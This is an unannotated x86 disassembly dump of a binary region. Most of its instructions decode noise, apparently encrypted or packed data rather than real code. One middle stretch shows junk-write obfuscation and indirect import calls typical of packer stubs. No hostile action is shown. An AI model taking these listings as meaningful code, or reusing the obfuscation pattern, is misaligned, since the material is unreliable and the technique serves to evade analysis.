  4041a9:	xor    al,0xe0
  4041ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041ac:	in     al,dx
  4041ad:	jae    0x4041dd
  4041af:	jle    0x4041ce
  4041b1:	test   eax,0xa333a707
  4041b6:	adc    edx,ebx
  4041b8:	fwait
  4041b9:	addr16 test edi,ebp
  4041bc:	lods   eax,DWORD PTR ds:[esi]
  4041bd:	retf   0x98e2
  4041c0:	aad    0xb0
  4041c2:	retf   0xbc9a
  4041c5:	sbb    eax,0x954bc700
  4041ca:	and    esi,ebx
  4041cc:	mov    eax,ds:0x3187f6cb
  4041d1:	sbb    esi,DWORD PTR [edi-0x54]
  4041d4:	or     eax,0xe2cc6f1e
  4041d9:	mov    esi,0x4651a4c9
  4041de:	jns    0x404198
  4041e0:	and    ah,BYTE PTR ds:0x88db86af
  4041e6:	in     eax,0x19
  4041e8:	xor    al,0xc0
  4041ea:	adc    al,0xc9
  4041ec:	inc    ebp
  4041ed:	std    
  4041ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041ef:	dec    ebp
  4041f0:	adc    ebx,DWORD PTR [ecx+0x1c23e34e]
  4041f6:	in     eax,0x17
  4041f8:	mov    cl,0xf1
  4041fa:	jnp    0x404204
  4041fc:	es retf 0xe54
  404200:	sub    al,0xc7
  404202:	sbb    edx,ecx
  404204:	mov    dh,0x2d
  404206:	int    0xde
  404208:	and    al,0x5b
  40420a:	loop   0x404247
  40420c:	clc    
  40420d:	cmp    esi,ebx
  40420f:	fwait
  404210:	jns    0x4041ec
  404212:	lods   eax,DWORD PTR ds:[esi]
  404213:	lods   al,BYTE PTR ds:[esi]
  404214:	shl    BYTE PTR [ecx+edx*8+0x595b1a32],cl
  40421b:	out    dx,eax
  40421c:	out    dx,al
  40421d:	pop    ds
  40421e:	ret    
  40421f:	xor    eax,0xe2677d6d
  404224:	mov    esi,edx
  404226:	mov    ah,0x21
  404228:	inc    ecx
  404229:	push   0xbc7faf65
  40422e:	or     edi,ecx
  404230:	shr    ebx,1
  404232:	inc    ebp
  404233:	outs   dx,DWORD PTR ds:[esi]
  404234:	adc    BYTE PTR [edi-0x17c75315],cl
  40423a:	ds in  eax,dx
  40423c:	(bad)  [esi+0x3f]
  40423f:	fimul  WORD PTR [eax-0x7c]
  404242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404243:	mov    esp,0xcea53eda
  404248:	sbb    edi,edi
  40424a:	inc    eax
  40424b:	xchg   edi,eax
  40424c:	add    cl,BYTE PTR [edx-0x4352495e]
  404252:	pop    edx
  404253:	ret    
  404254:	retf   
  404255:	push   0x44
  404257:	push   cs
  404258:	and    al,bl
  40425a:	mov    bh,0x5c
  40425c:	scas   eax,DWORD PTR es:[edi]
  40425d:	ror    DWORD PTR [ecx+0x64],1
  404260:	(bad)  
  404261:	jmp    0xb096:0x33bdc370
  404268:	nop
  404269:	leave  
  40426a:	inc    ebp
  40426b:	sbb    al,0x15
  40426d:	test   al,0x48
  40426f:	mov    dh,0xa0
  404271:	fst    QWORD PTR [ebp+edx*8-0x218256e]
  404278:	xchg   edi,eax
  404279:	mov    DWORD PTR fs:[ebx-0x51ee9120],eax
  404280:	out    dx,eax
  404281:	sbb    DWORD PTR [esi-0x128fed8c],ecx
  404287:	jp     0x4042c4
  404289:	retf   
  40428a:	ror    DWORD PTR ds:0xa9102158,1
  404290:	add    eax,DWORD PTR [edi+0x39]
  404293:	xor    ebp,eax
  404295:	push   edx
  404296:	mov    BYTE PTR [esi-0x11],0xc6
  40429a:	cdq    
  40429b:	lock xor BYTE PTR [ebp+edi*2+0x6e0dc81e],dl
  4042a3:	jb     0x404266
  4042a5:	ret    0xa372
  4042a8:	dec    esp
  4042a9:	test   eax,0xf1967037
  4042ae:	call   0xdcae:0xb6f5f671
  4042b5:	out    0x20,eax
  4042b7:	mov    ds:0xcaf1c4a7,al
  4042bc:	(bad)
  4042c0:	jmp    0xe1dd:0x12e1b63c
  4042c7:	enterw 0x1529,0x72
  4042cc:	add    eax,0x2a982c9f
  4042d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042d2:	pop    es
  4042d3:	rol    DWORD PTR [esi-0xd244380],cl
  4042d9:	push   ds
  4042da:	push   cs
  4042db:	int3   
  4042dc:	xor    esp,DWORD PTR [ebx+0x28]
  4042df:	ss out dx,al
  4042e1:	or     cl,BYTE PTR [ebx+0x10fd41e2]
  4042e7:	and    eax,esp
  4042e9:	repz faddp st(6),st
  4042ec:	push   edx
  4042ed:	daa    
  4042ee:	xchg   edx,eax
  4042ef:	push   esi
  4042f0:	scas   eax,DWORD PTR es:[edi]
  4042f1:	stos   DWORD PTR es:[edi],eax
  4042f2:	push   es
  4042f3:	mov    ah,0x91
  4042f5:	clc    
  4042f6:	add    al,0x51
  4042f8:	in     eax,dx
  4042f9:	mov    BYTE PTR [esi-0x13e51b92],al
  4042ff:	adc    BYTE PTR [esi+0x2b],dl
  404302:	ja     0x4042c1
  404304:	popf   
  404305:	mov    ss,ebp
  404307:	jb     0x4042df
  404309:	push   esp
  40430a:	xchg   edi,eax
  40430b:	jle    0x404363
  40430d:	mov    al,ds:0x9287c15
  404312:	jnp    0x404339
  404314:	mov    eax,ds:0xc1b6b96d
  404319:	xor    BYTE PTR [edx+0x2efb791b],0x7
  404320:	sub    al,0xda
  404322:	lahf   
  404323:	jp     0x40439a
  404325:	and    ebx,ebx
  404327:	and    BYTE PTR [edi+0x7df60592],al
  40432d:	test   eax,0x6e0be74c
  404332:	std    
  404333:	iret   
  404334:	aam    0x1a
  404336:	add    ah,BYTE PTR [esi]
  404338:	retf   
  404339:	mov    bh,0xfd
  40433b:	mov    al,0x5d
  40433d:	add    dl,BYTE PTR [eax]
  40433f:	pop    ds
  404340:	loopne 0x4043b8
  404342:	cld    
  404343:	sti    
  404344:	sub    cl,BYTE PTR gs:[ebx+0x5c7ec4d]
  40434b:	call   0x66:0x72004229
  404352:	add    BYTE PTR [ebx],bh
  404354:	add    edi,eax
  404356:	add    eax,0x42289a
  40435b:	loopne 0x404369
  40435d:	add    BYTE PTR [eax],al
  40435f:	jne    0x4044cf
  404365:	or     eax,DWORD PTR ds:0x422922
  40436b:	mov    eax,DWORD PTR [ebp-0xc]
  40436e:	cmp    DWORD PTR ds:0x4229ce,0x0
  404375:	mov    ecx,DWORD PTR ds:0x4229b2
  40437b:	not    ecx
  40437d:	jmp    0x4043e2
  404382:	mov    DWORD PTR ds:0x4228ce,0x6b59
  40438c:	mov    DWORD PTR ds:0x4228a6,edi
  404392:	jb     0x4043a7
  404398:	push   0x82d3
  40439d:	call   DWORD PTR ds:0x42a010
  4043a3:	xor    ecx,ecx
  4043a5:	adc    edx,ecx
  4043a7:	or     DWORD PTR ds:0x422992,0x7718
  4043b1:	mov    ecx,DWORD PTR ds:0x422a76
  4043b7:	mov    edx,DWORD PTR ds:0x422ade
  4043bd:	sub    ecx,edx
  4043bf:	xor    ecx,DWORD PTR [ecx+edx*1]
  4043c2:	mov    ecx,DWORD PTR ds:0x4229fe
  4043c8:	xor    edx,edx
  4043ca:	or     edx,DWORD PTR ds:0x422ace
  4043d0:	sub    edx,ecx
  4043d2:	sub    ecx,DWORD PTR [ecx+edx*1]
  4043d5:	movzx  edx,BYTE PTR ds:0x42292e
  4043dc:	add    DWORD PTR ds:0x4229a2,edx
  4043e2:	mov    ecx,DWORD PTR [ebp+0x20]
  4043e5:	movzx  edx,WORD PTR ds:0x4229ba
  4043ec:	or     edx,DWORD PTR ds:0x4229b2
  4043f2:	mov    DWORD PTR ds:0x4229ba,edx
  4043f8:	xor    DWORD PTR [eax],ecx
  4043fa:	mov    eax,DWORD PTR [ebp-0xc]
  4043fd:	mov    ecx,DWORD PTR [ebp+0x18]
  404400:	adc    DWORD PTR ds:0x422992,0x4b0d
  40440a:	mov    edx,DWORD PTR [ebp+0x1c]
  40440d:	shrd   ecx,edx,0x2
  404411:	and    DWORD PTR ds:0x4229ba,0x18b0
  40441b:	mov    DWORD PTR [ebp-0x14],ecx
  40441e:	add    ecx,0x56bc
  404424:	mov    ecx,DWORD PTR [ebp+0x18]
  404427:	xor    DWORD PTR [ebp-0x14],edi
  40442a:	sbb    DWORD PTR ds:0x42291e,0x4252
  404434:	shr    edx,0x2
  404437:	mov    edx,DWORD PTR [ebp+0x1c]
  40443a:	add    DWORD PTR ds:0x4228ce,0x42299e
  404444:	xor    edx,edx
  404446:	and    DWORD PTR ds:0x4228d6,0x4228ea
  404450:	or     edx,DWORD PTR [ebp-0x14]
  404453:	add    DWORD PTR ds:0x42289e,0x4229a2
  40445d:	shl    ecx,0x1e
  404460:	cmp    DWORD PTR ds:0x42294e,0x0
  404467:	mov    ecx,0x1e7
  40446c:	mov    DWORD PTR ds:0x4228ba,0x3be7
  404476:	mov    DWORD PTR ds:0x4229a2,edx
  40447c:	mov    ecx,0x41a9
  404481:	jmp    0x4044cd
  404486:	mov    DWORD PTR ds:0x42297a,0x6783
  404490:	mov    DWORD PTR ds:0x4228ee,0x5319
  40449a:	jl     0x4044b5
  4044a0:	push   DWORD PTR [ebp-0x18]
  4044a3:	call   DWORD PTR ds:0x42a014
  4044a9:	or     ecx,DWORD PTR ds:0x42290e
  4044af:	xor    DWORD PTR ds:0x4228d6,ebx
  4044b5:	xor    DWORD PTR ds:0x4229b2,0x1ac5
  4044bf:	inc    DWORD PTR ds:0x422956
  4044c5:	add    ecx,0x7d03
  4044cb:	not    ecx
  4044cd:	sub    DWORD PTR [eax],edx
  4044cf:	mov    eax,ds:0x4220e0
  4044d4:	mov    ecx,DWORD PTR [ebp-0xc]
  4044d7:	sbb    edx,DWORD PTR ds:0x4228c2
  4044dd:	mov    eax,DWORD PTR [eax]
  4044df:	add    eax,DWORD PTR [ecx]
  4044e1:	mov    edx,DWORD PTR ds:0x42297e
  4044e7:	and    edx,DWORD PTR ds:0x42288e
  4044ed:	mov    DWORD PTR ds:0x42297e,edx
  4044f3:	mov    DWORD PTR [ebp-0x14],eax
  4044f6:	mov    ecx,DWORD PTR [ebx]
  4044f8:	or     DWORD PTR ds:0x422922,edx
  4044fe:	mov    eax,DWORD PTR [ebx+0x4]
  404501:	xor    DWORD PTR ds:0x42299e,ebx
  404507:	jmp    0x404a91
  40450c:	xlat   BYTE PTR ds:[ebx]
  40450d:	mov    edi,0x38f472f4
  404512:	push   eax
  404513:	xor    dl,BYTE PTR [eax+0x6e68228e]
  404519:	sub    BYTE PTR [edx+0x16c18772],dh
  40451f:	push   ss
  404520:	cmp    eax,0x72161604
  404525:	lea    edx,[ebp-0x24]
  404528:	inc    edi
  404529:	addr16 dec ecx
  40452b:	scas   al,BYTE PTR es:[edi]
  40452c:	(bad)  
  40452d:	aad    0x57
  40452f:	dec    esp
  404530:	add    BYTE PTR [edi+0x34],bh
  404533:	pop    esp
  404534:	cdq    
  404535:	mov    esp,0xef0fc0dd
  40453a:	int3   
  40453b:	jne    0x404509
  40453d:	arpl   WORD PTR [ebx+edx*2-0x2c],di
  404541:	sahf   
  404542:	retf   0x61ae
  404545:	mov    ch,0x27
  404547:	aad    0x90
  404549:	adc    ah,BYTE PTR [ebp-0x2a]
  40454c:	int    0xd3
  40454e:	(bad)  
  40454f:	in     eax,0xec
  404551:	pop    eax
  404552:	cmc    
  404553:	jecxz  0x404571
  404555:	ins    BYTE PTR es:[edi],dx
  404556:	int3   
  404557:	push   0x36a1b951
  40455c:	ror    DWORD PTR [si-0x2f95],cl
  404561:	rol    dl,0x88
  404564:	or     dl,BYTE PTR [ebp+0x7cdebf93]
  40456a:	sbb    al,0x1b
  40456c:	rcr    dh,cl
  40456e:	jl     0x40457f
  404570:	inc    edi
  404571:	xlat   BYTE PTR ds:[ebx]
  404572:	jle    0x404549
  404574:	cmp    bh,BYTE PTR [edx-0x65]
  404577:	xchg   edi,eax
  404579:	arpl   dx,ax
  40457b:	ins    DWORD PTR es:[edi],dx
  40457c:	dec    ecx
  40457d:	and    eax,0x21b13842
  404582:	out    dx,al
  404583:	das    
  404584:	add    DWORD PTR [ebx+0x35703a42],edx
  40458a:	xchg   edx,eax
  40458b:	mov    eax,ds:0x98416ef0
  404590:	sbb    BYTE PTR [edi],ah
  404592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404593:	mov    bh,0x28
  404595:	call   0xfc872716
  40459a:	in     eax,0xd3
  40459c:	mov    si,0x4ad7
  4045a0:	cmp    BYTE PTR [ebp+0x2],ah
  4045a3:	ror    BYTE PTR [edx+0x36b8bb4a],0xe2
  4045aa:	jnp    0x4045f6
  4045ac:	adc    eax,0xe8a9140
  4045b1:	ror    DWORD PTR [edi+edx*4],cl
  4045b4:	sar    BYTE PTR [edi+0x16],1
  4045b7:	frstor [ecx]
  4045b9:	sub    al,BYTE PTR [ecx+0x7931a262]
  4045bf:	mov    edx,0xbeea50e3
  4045c4:	rol    dh,cl
  4045c6:	push   es
  4045c7:	imul   BYTE PTR [ecx-0x27c2b214]
  4045cd:	xor    edi,DWORD PTR [ecx-0xe]
  4045d0:	ret    
  4045d1:	shl    BYTE PTR [eax+0x69],1
  4045d4:	and    DWORD PTR [edx-0x3b],edi
  4045d7:	and    DWORD PTR [ebx],esp
  4045d9:	adc    DWORD PTR [ecx+0x0],esp
  4045dc:	enter  0xb366,0x5d
  4045e0:	into   
  4045e1:	imul   ebx
  4045e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045e4:	xlat   BYTE PTR ds:[ebx]
  4045e5:	rcl    BYTE PTR [edi-0x2d],cl
  4045e8:	add    eax,0x4fe6c25f
  4045ed:	repnz xlat BYTE PTR ds:[ebx]
  4045ef:	test   eax,0x9f4c066f
  4045f4:	sbb    BYTE PTR [ecx],ch
  4045f6:	shr    BYTE PTR [ebp-0x7e518906],1
  4045fc:	ret    
  4045fd:	in     eax,0x93
  4045ff:	xor    BYTE PTR [edi-0x1c],0x35
  404603:	adc    DWORD PTR [esp+ebp*1-0x4f],esp
  404607:	inc    esp
  404608:	and    eax,DWORD PTR [ecx-0x33]
  40460b:	mov    ebp,0xa3644c0
  404610:	repz ja 0x4045e6
  404613:	xor    al,0x12
  404615:	push   ecx
  404616:	dec    ebx
  404617:	jg     0x4045a1
  404619:	and    eax,eax
  40461b:	push   es
  40461c:	sbb    al,0x26
  40461e:	repnz std 
  404620:	or     ebp,ecx
  404622:	ss cmp al,0xc5
  404625:	gs xchg ebx,edi
  404628:	and    al,0x2f
  40462a:	mov    ch,0x2e
  40462c:	xchg   esp,eax
  40462d:	push   edi
  40462e:	in     eax,dx
  40462f:	aam    0x7b
  404631:	loope  0x4046af
  404633:	repnz mov ds:0x41145b0e,eax
  404639:	sub    edi,edx
  40463b:	jmp    0x9d0dbb2c
  404640:	sub    al,BYTE PTR ds:0x9a1a8cad
  404646:	stc    
  404647:	neg    bh
  404649:	and    bl,BYTE PTR [ebx+eax*8+0x4c95d702]
  404650:	fadd   QWORD PTR [eax-0x1f]
  404653:	call   0x85d0261b
  404658:	popf   
  404659:	sar    BYTE PTR [esi+ecx*8+0x14],cl
  40465d:	scas   eax,DWORD PTR es:[edi]
  40465e:	xchg   esp,eax
  40465f:	jae    0x404607
  404661:	test   BYTE PTR [edx+eiz*1-0x20],ah
  404665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404666:	ja     0x404641
  404668:	xchg   esp,eax
  404669:	pop    ds
  40466a:	add    al,0xb2
  40466c:	and    eax,0x540a0fad
  404671:	inc    edi
  404672:	call   0x13f8:0xadb392d2
  404679:	dec    ebx
  40467a:	popf   
  40467b:	icebp  
  40467c:	push   esp
  40467d:	ret    
  40467e:	mov    esp,0x6f5ca1f2
  404683:	dec    esi
  404684:	js     0x4046fa
  404686:	mov    ds:0x1dfb683,al
  40468b:	(bad)  
  40468c:	xchg   esi,eax
  40468d:	jnp    0x40468b
  40468f:	xchg   edi,eax
  404690:	xor    eax,0x2134f2c5
  404695:	xlat   BYTE PTR ds:[ebx]
  404696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404697:	and    cl,dl
  404699:	jns    0x4046f8
  40469b:	ret    
  40469c:	mov    edx,0x22c490c0
  4046a1:	ficomp DWORD PTR [edi]
  4046a3:	or     al,0x51
  4046a5:	and    al,0x61
  4046a7:	jmp    0x2dc14233
  4046ac:	inc    ecx
  4046ad:	mov    bl,BYTE PTR [edi-0xd9b8d49]
  4046b3:	fstp   QWORD PTR ds:0xc2fab5f
  4046ba:	daa    
  4046bb:	mov    ecx,0x9866aea7
  4046c0:	jne    0x404686
  4046c2:	inc    esi
  4046c3:	cmp    al,BYTE PTR [esi-0x6ba76c2b]
  4046c9:	and    DWORD PTR [esi],0x6e3927bb
  4046cf:	mov    ebx,0x9fadf94c
  4046d4:	pop    es
  4046d5:	cdq    
  4046d6:	stos   BYTE PTR es:[edi],al
  4046d7:	pop    ebp
  4046d8:	call   0xce8b:0x29cc7179
  4046df:	(bad)  
  4046e0:	hlt    
  4046e1:	jg     0x4046cd
  4046e3:	mov    BYTE PTR [edi+0x5833d83],0x4c
  4046ea:	in     eax,0xc2
  4046ec:	push   edi
  4046ed:	inc    eax
  4046ee:	das    
  4046ef:	popf   
  4046f0:	sbb    ah,cl
  4046f2:	pop    eax
  4046f3:	mov    ecx,esi
  4046f5:	sbb    al,BYTE PTR [eax+0x2]
  4046f8:	call   0xe6e6:0x602cd753
  4046ff:	mov    al,0x44
  404701:	pop    ebx
  404702:	mov    bh,0xab
  404704:	cli    
  404705:	mov    esi,0x70aecb69
  40470a:	push   esp
  40470b:	and    al,0x6c
  40470d:	das    
  40470e:	dec    ecx
  40470f:	cs inc ecx
  404711:	inc    ecx
  404712:	stc    
  404713:	adc    dh,BYTE PTR [eax]
  404715:	jmp    0x40469b
  404717:	dec    esi
  404718:	stc    
  404719:	jne    0x404775
  40471b:	xchg   ebp,eax
  40471c:	(bad)  
  40471d:	dec    esi
  40471e:	test   ebp,ebp
  404720:	inc    ebp
  404721:	popa   
  404722:	inc    eax
  404723:	sub    BYTE PTR [ebx+0x7f],0xfe
  404727:	int3   
  404728:	test   al,0xea
  40472a:	sub    al,BYTE PTR [edx]
  40472c:	cs fwait
  40472e:	bound  esp,QWORD PTR [ebx+ecx*2-0x4c]
  404732:	leave  
  404733:	mov    eax,0xfafa3e1c
  404738:	loop   0x404767
  40473a:	xchg   DWORD PTR [esi],ebx
  40473c:	jge    0x40472b
  40473e:	sub    cl,0xe3
  404741:	jmp    0x9d40f190
  404746:	xchg   edx,eax
  404747:	out    0x19,al
  404749:	xchg   edi,eax
  40474a:	xchg   BYTE PTR [ebx],dh
  40474c:	out    dx,eax
  40474d:	or     BYTE PTR [esi],bh
  40474f:	xor    dl,ah
  404751:	inc    eax
  404752:	in     al,dx
  404753:	cmp    al,BYTE PTR [edx]
  404755:	cmp    ecx,edi
  404757:	push   ebp
  404758:	jl     0x404787
  40475a:	mov    ch,0x75
  40475c:	inc    esp
  40475d:	lods   al,BYTE PTR ds:[esi]
  40475e:	xor    BYTE PTR [ebp+ecx*8-0x68],dh
  404762:	and    DWORD PTR [esi+esi*2-0x6f653575],ecx
  404769:	jmp    0x9050e067
  40476e:	mov    al,ds:0xedfb300c
  404773:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404775:	clc    
  404776:	daa    
  404777:	lock js 0x404708
  40477a:	mov    ch,0x15
  40477c:	adc    BYTE PTR [ecx+ebp*1-0x6e],0xb
  404781:	xchg   edx,eax
  404782:	cmp    BYTE PTR ds:0xabc349ec,cl
  404788:	scas   al,BYTE PTR es:[edi]
  404789:	dec    eax
  40478a:	ror    edi,1
  40478c:	or     DWORD PTR [esp+ebp*2+0x48],esp
  404790:	add    al,0x65
  404792:	clc    
  404793:	repnz xlat BYTE PTR ds:[ebx]
  404795:	fidivr WORD PTR [ecx-0x7f]
  404798:	test   DWORD PTR [ebp+0x6b3a1df6],0x9b3c0f15
  4047a2:	loop   0x40477f
  4047a4:	jae    0x404773
  4047a6:	shr    ecx,cl
  4047a8:	push   esi
  4047a9:	je     0x404734
  4047ab:	mov    dh,0x84
  4047ad:	jl     0x404760
  4047af:	pop    edx
  4047b0:	stc    
  4047b1:	mov    al,BYTE PTR [eax-0x15932289]
  4047b7:	jmp    0x34b9:0x2c03854b
  4047be:	das    
  4047bf:	stc    
  4047c0:	add    al,0x90
  4047c2:	dec    edx
  4047c3:	lods   eax,DWORD PTR ds:[esi]
  4047c4:	push   cs
  4047c5:	test   ch,ah
  4047c7:	push   eax
  4047c8:	outs   dx,DWORD PTR ds:[esi]
  4047c9:	out    0x1a,eax
  4047cb:	and    dh,ah
  4047cd:	push   edi
  4047ce:	les    edi,FWORD PTR [edx-0x2a4732af]
  4047d4:	and    esp,DWORD PTR [edx+0x19c5533a]
  4047da:	outs   dx,BYTE PTR ds:[esi]
  4047db:	ins    DWORD PTR es:[edi],dx
  4047dc:	mov    edi,0x652619d6
  4047e1:	mov    edx,DWORD PTR [eax-0x28236b4d]
  4047e7:	jbe    0x404800
  4047e9:	lea    eax,[edi+0x6ca579ef]
  4047ef:	loop   0x4047ce
  4047f1:	in     al,0xd9
  4047f3:	mov    dh,0xda
  4047f5:	or     BYTE PTR [edi+edi*2-0x5223cdb2],bh
  4047fc:	push   ss
  4047fd:	mov    esp,0x5d9b95c0
  404802:	(bad)  
  404803:	adc    esi,esp
  404805:	int    0xc4
  404807:	shl    DWORD PTR [ebp+0x71],0x9a
  40480b:	test   DWORD PTR [edi+0x4c],ebp
  40480e:	int    0x9b
  404810:	mov    ds:0x1f104219,eax
  404815:	mov    esp,edi
  404817:	push   esp
  404818:	ret    
  404819:	xchg   DWORD PTR [eax],esi
  40481b:	mov    ch,0x28
  40481d:	dec    edi
  40481e:	fsubp  st(6),st
  404820:	lds    ebx,FWORD PTR [eax+esi*2]
  404823:	cld    
  404824:	mov    ebx,esp
  404826:	lods   al,BYTE PTR ds:[esi]
  404827:	pushf  
  404828:	xchg   esp,eax
  404829:	sub    DWORD PTR ds:0xcba24f27,edx
  40482f:	dec    ebx
  404830:	shr    BYTE PTR [ecx],1
  404832:	sub    eax,0xaad3424a
  404837:	pop    ds
  404838:	lock mov ds,WORD PTR [ebx]
  40483b:	rol    eax,0xba
  40483e:	rcl    BYTE PTR [eax-0x2],1
  404841:	imul   edi,ebx,0x65
  404844:	sub    BYTE PTR [ebp+edx*1+0x63],bh
  404848:	(bad)  
  40484a:	jne    0x4047d2
  40484c:	adc    bl,bl
  40484e:	push   edi
  40484f:	xchg   DWORD PTR [ebx+0x57c5c847],esi
  404855:	imul   ebx,DWORD PTR [ebp-0x3043021c],0x6
  40485c:	dec    edx
  40485d:	adc    eax,0x90f26ef3
  404862:	jae    0x404896
  404864:	xor    BYTE PTR [eax],dl
  404866:	sub    ch,al
  404868:	aam    0x4f
  40486a:	cmp    BYTE PTR [ebp+0x45],dh
  40486d:	xchg   ecx,eax
  40486e:	addr16 xchg esp,eax
  404870:	fs (bad) 
  404872:	and    ebx,DWORD PTR [edx]
  404874:	sub    eax,0xdc106e48
  404879:	cmp    ebx,ebx
  40487b:	jbe    0x404861
  40487d:	mov    esp,0x6b44a2b6
  404882:	cmp    dh,BYTE PTR [esi-0x75]
  404885:	test   eax,0xa2255ee7
  40488a:	cmp    ebx,DWORD PTR [edx+edi*1+0x71a90e6b]
  404891:	push   ecx
  404892:	in     eax,dx
  404893:	ins    DWORD PTR es:[edi],dx
  404894:	prefetch BYTE PTR [esi-0x5d]
  404898:	pop    esi
  404899:	inc    edx
  40489a:	adc    esp,eax
  40489c:	add    eax,0x8dd25ee8
  4048a1:	push   edi
  4048a2:	loop   0x4048ba
  4048a4:	call   0x7fad81f6
  4048a9:	mov    bl,0x7c
  4048ab:	sub    eax,0x4837f2e0
  4048b0:	dec    ebx
  4048b1:	arpl   bp,bx
  4048b3:	push   es
  4048b4:	dec    esi
  4048b5:	outs   dx,BYTE PTR ds:[esi]
  4048b6:	retf   
  4048b7:	xchg   DWORD PTR ds:0x276df440,edi
  4048bd:	xor    BYTE PTR [edi-0x2c52cb3a],dh
  4048c3:	mov    eax,ds:0x7350bd12
  4048c8:	iret   
  4048c9:	call   0x618b:0xaf14ca63
  4048d0:	add    al,BYTE PTR [edx+0x1ab3fa80]
  4048d6:	mov    esp,0xaaf2a5cb
  4048db:	dec    esp
  4048dc:	xchg   BYTE PTR [edx+0x2a],dh
  4048df:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048e1:	(bad)  
  4048e2:	cmp    dh,BYTE PTR [eax+ebx*2+0x4e39f181]
  4048e9:	jbe    0x404931
  4048eb:	test   bl,dh
  4048ed:	xor    eax,DWORD PTR [ebx]
  4048ef:	jmp    0x516b:0x4e4afbea
  4048f6:	test   DWORD PTR [ebp*1+0x485348fc],eax
  4048fd:	rcr    ch,0x4
  404900:	pusha  
  404901:	(bad)  
  404902:	push   ds
  404903:	sub    eax,0xb44dd866
  404908:	add    al,BYTE PTR [edx]
  40490a:	and    al,0x98
  40490c:	or     esp,ecx
  40490e:	jg     0x4048ac
  404910:	and    ebx,edx
  404912:	jb     0x404948
  404914:	pop    ebx
  404915:	push   ss
  404916:	inc    edi
  404917:	adc    bl,BYTE PTR [ecx+0x62]
  40491a:	and    ah,BYTE PTR [eax+0x3f]
  40491d:	inc    ebp
  40491e:	fucompp 
  404920:	rol    BYTE PTR [edx-0x51],cl
  404923:	xor    eax,0xf83eb447
  404928:	in     al,0x4d
  40492a:	sahf   
  40492b:	mov    cl,0xdd
  40492d:	jo     0x404994
  40492f:	sub    BYTE PTR [edx-0x10c94de9],bl
  404935:	aaa    
  404936:	jg     0x404903
  404938:	test   BYTE PTR [edx-0x9],ah
  40493b:	jbe    0x404908
  40493d:	mov    eax,0x66f8babb
  404942:	mov    esi,ebx
  404944:	add    eax,0xb039057b
  404949:	sbb    al,BYTE PTR [ecx]
  40494b:	push   edx
  40494c:	jmp    0x2dce:0x53ed3ec5
  404953:	xchg   ecx,eax
  404954:	repnz test BYTE PTR [ecx],bl
  404957:	ret    
  404958:	jo     0x404978
  40495a:	cmp    eax,0xc652bb04
  40495f:	enter  0xc2c5,0xab
  404963:	clc    
  404964:	scas   al,BYTE PTR es:[edi]
  404965:	shl    BYTE PTR [ebp+0x314ab5cc],cl
  40496b:	mov    ebp,cs
  40496d:	cwde   
  40496e:	xor    edi,DWORD PTR [edx-0x7a]
  404971:	jmp    0x5c4a:0xe02cb076
  404978:	repnz mov ds:0x82d25f7a,eax
  40497e:	adc    eax,0x40596432
  404983:	test   DWORD PTR [esp+eiz*2-0x54],0x2d3da4b6
  40498b:	sbb    esi,DWORD PTR [ecx-0x5e658589]
  404991:	pop    ecx
  404992:	sbb    al,0xb7
  404994:	call   0x8850589f
  404999:	call   0xee6c8bc9
  40499e:	stos   BYTE PTR es:[edi],al
  40499f:	test   al,0x5f
  4049a1:	jb     0x404988
  4049a3:	mov    al,0x26
  4049a5:	das    
  4049a6:	mov    edi,0x86132282
  4049ab:	in     al,dx
  4049ac:	ins    WORD PTR es:[edi],dx
  4049ae:	adc    eax,esi
  4049b0:	mov    dl,0x28
  4049b2:	dec    esi
  4049b3:	popf   
  4049b4:	lahf   
  4049b5:	dec    ecx
  4049b6:	mov    al,ds:0x896ab7c2
  4049bb:	jno    0x404977
  4049bd:	jne    0x404979
  4049bf:	mov    edx,0x26dbbdca
  4049c4:	pop    esi
  4049c5:	fbstp  TBYTE PTR [edx+0x3aeb36d0]
  4049cb:	mov    DWORD PTR [esp+esi*1+0x35],edx
  4049cf:	ret    0x252a
  4049d2:	das    
  4049d3:	out    dx,al
  4049d4:	jecxz  0x4049d6
  4049d6:	push   es
  4049d7:	mov    cl,0x42
  4049d9:	ds sub al,0xcb
  4049dc:	es cmc 
  4049de:	jns    0x404980
  4049e0:	xor    cl,cl
  4049e2:	pop    ds
  4049e3:	xor    al,0x3d
  4049e5:	or     al,0x6a
  4049e7:	mov    esp,0xddeac97b
  4049ec:	mov    BYTE PTR [esi+0x3f0f1af1],bh
  4049f2:	mov    ecx,0x27068407
  4049f7:	add    BYTE PTR [edi-0x480c502f],al
  4049fd:	push   cs
  4049fe:	ret    0x15cd
  404a01:	mov    ds:0x9e231896,eax
  404a06:	mov    BYTE PTR [ecx+0x407be62],dh
  404a0c:	ds dec eax
  404a0e:	inc    ebx
  404a0f:	enter  0xf2b8,0xd3
  404a13:	mov    bh,BYTE PTR [edx+0x2571097c]
  404a19:	rcl    BYTE PTR [eax],1
  404a1b:	scas   al,BYTE PTR es:[edi]
  404a1c:	jmp    0x4049d9
  404a1e:	mov    ds:0x875e1808,al
  404a23:	stos   DWORD PTR es:[edi],eax
  404a24:	add    BYTE PTR [eax-0x629fc846],bl
  404a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a2b:	std    
  404a2c:	je     0x404a54
  404a2e:	stc    
  404a2f:	push   0xffffffad
  404a31:	sub    BYTE PTR [esi+0x570b5418],bh
  404a37:	scas   al,BYTE PTR es:[edi]
  404a38:	out    dx,al
  404a39:	shr    DWORD PTR [ebp+0x3303874e],cl
  404a3f:	and    dh,ch
  404a41:	stos   BYTE PTR es:[edi],al
  404a42:	mov    cs,WORD PTR [edi+0x1007da75]
  404a48:	stc    
  404a49:	add    al,0x5f
  404a4b:	js     0x404aa8
  404a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a4e:	lds    ebp,FWORD PTR [edi+edx*2]
  404a51:	xor    al,0x29
  404a53:	fwait
  404a54:	es push es
  404a56:	jnp    0x404a3a
  404a58:	hlt    
  404a59:	push   edi
  404a5a:	mov    eax,ds:0xe55b5d3a
